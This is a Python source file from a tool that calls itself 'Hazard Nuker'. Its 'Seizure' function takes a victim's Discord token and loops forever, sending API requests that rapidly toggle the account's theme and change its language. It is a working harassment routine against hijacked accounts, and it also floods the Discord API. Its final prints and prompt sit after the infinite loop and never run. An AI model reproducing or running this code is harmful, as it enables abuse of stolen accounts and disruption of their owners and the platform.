# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import requests
import Hazard

import random
from itertools import cycle
from colorama import Fore

from util.plugins.common import clear, print_slow, getheaders, THIS_VERSION

#was a bit lazy with this so it's not completely done
def Seizure(token):
    print(f'{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n')
    modes = cycle(["light", "dark"])
    #cycle between light/dark mode and languages 
    while True:
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=getheaders(token), json=setting)
    print_slow(f"{Fore.LIGHTGREEN_EX}Seizure Started! ")
    print("Enter anything to stop. . . ", end="")
    input()
    Hazard.main()